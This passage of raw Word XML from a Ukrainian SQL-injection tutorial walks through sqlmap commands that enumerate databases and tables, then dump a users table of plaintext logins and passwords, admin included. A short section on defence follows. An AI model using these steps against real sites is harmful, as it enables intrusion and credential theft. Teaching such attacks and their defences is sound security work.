      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E2A1D6E" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>[*] c9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B7F115" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>[*] information_schema</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA89096" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>[*] mysql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBFC227" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>[*] mystorage</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23882F28" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>[*] performance_schema</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BD2F3F8" w14:textId="5262D028" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>[*] phpmyadmin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D42C656" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6AF442DF" w14:textId="0ADFF601" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C12BBD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">Тепер дізнаємося які є таблиці в базі даних с9.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цього замість </w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>dbs</w:t>
      </w:r>
      <w:r w:rsidRPr="00C12B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напишемо </w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>tables</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rStyle w:val="Heading3Char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739F8FC" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E7BF59C" w14:textId="648A25DB" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p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Вивід такий:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22DB27A4" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DBF2E58" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>Database: c9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t>                                                                   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A61F47C" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>[2 tables]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AECFF1C" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>+-------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41038247" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>| pages |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA9C4F8" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>| users |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F63C82" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>+-------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1ACD7A" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRPr="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A4F5B67" w14:textId="379E42A7" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p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Ну і останнє: подивимося вміст таблиці </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>pages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написавши замість </w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>dbs</w:t>
      </w:r>
      <w:r w:rsidRPr="00C12B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напишемо </w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>dump</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
          <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21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CF4865C" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BD34EF1" w14:textId="3733FEDF" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p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Отримали усю інформацію:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50BF74D3" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>Database: c9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t>                                                                   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF194C6" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>Table: users</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE54CC4" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>[3 entries]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40BED711" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>+----+-------+----------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744D752C" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>| id | login | password |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A951C8F" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>+----+-------+----------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2575724B" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>| 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>| admin | 12345678 |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25AE60A5" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>| 2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| misha | pass </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DBE52AA" w14:textId="77777777" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>| 3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>| jack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>| QweryAsd |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35BFD557" w14:textId="7820657A" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="s1"/>
        </w:rPr>
        <w:t>+----+-------+----------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE1FD46" w14:textId="3BC16ABB" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p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Усе. Тепер ми </w:t>
      </w:r>
      <w:r w:rsidRPr="0066454A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>наємо усі логіни і паролі користувачів, в тому числі і адміністратора сайту, а отже можемо робити усе, що захочемо на сайті.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EEF41EF" w14:textId="062859FC" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="p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5510C80D" w14:textId="7FD77AB4" w:rsidR="00C12BBD" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Захист</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B2504E" w14:textId="7651F986" w:rsidR="0066454A" w:rsidRPr="0066454A" w:rsidRDefault="00C12BBD" w:rsidP="0066454A">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Проте, як не дивно захист від такого виду зламу дуже простий: фільтрувати</w:t>
      </w:r>
      <w:r w:rsidR="0066454A" w:rsidRPr="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> дані</w:t>
      </w:r>
      <w:r w:rsidR="0066454A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">. В даному випадку перш, ніж звертатися до таблиці необхідно перевірити параметр id на числовий формат. Це можна зробити командою </w:t>
      </w:r>
      <w:r w:rsidR="0066454A" w:rsidRPr="006778D7">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">$x = </w:t>
      </w:r>
      <w:r w:rsidR="0066454A">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="0066454A" w:rsidRPr="0066454A">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">int) </w:t>
      </w:r>
      <w:r w:rsidR="0066454A" w:rsidRPr="006778D7">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>$_GET['id'];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="088B3F62" w14:textId="1660E95E" w:rsidR="00C12BBD" w:rsidRPr="0066454A" w:rsidRDefault="00C12BBD" w:rsidP="00C12BBD">
      <w:pPr>
